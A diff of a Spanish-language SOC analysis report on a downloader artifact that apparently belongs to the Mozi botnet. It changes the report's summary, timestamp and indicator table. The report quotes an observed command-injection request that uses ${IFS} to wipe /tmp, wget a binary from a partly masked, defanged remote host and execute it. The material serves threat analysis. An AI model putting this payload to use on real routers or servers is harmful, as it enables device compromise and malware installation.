@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 162 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Mozi.a` en `hxxp://115.56.155.XXX:46909/Mozi.a`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:07:44+00:00`
+- **Registrado:** `2026-08-09T20:07:44.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -53,10 +54,10 @@ GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://11
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 115.56.155.XXX | static_analysis |
 | url | hxxp://115.56.155.XXX:46909/Mozi.a;sh$ | strings |
-| hash | 545de5285c3dbdb2bbacf08c9e034ce7be97f22e48099f5715c08059ba56ef9e | static_analysis |
+| ip | 115.56.155.XXX | static_analysis |
 | command | GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://115.56.155.XXX:46909/Mozi.a;sh${IFS}/tmp/M | strings |
+| hash | 545de5285c3dbdb2bbacf08c9e034ce7be97f22e48099f5715c08059ba56ef9e | static_analysis |
 
 ## 🔎 Triage
 
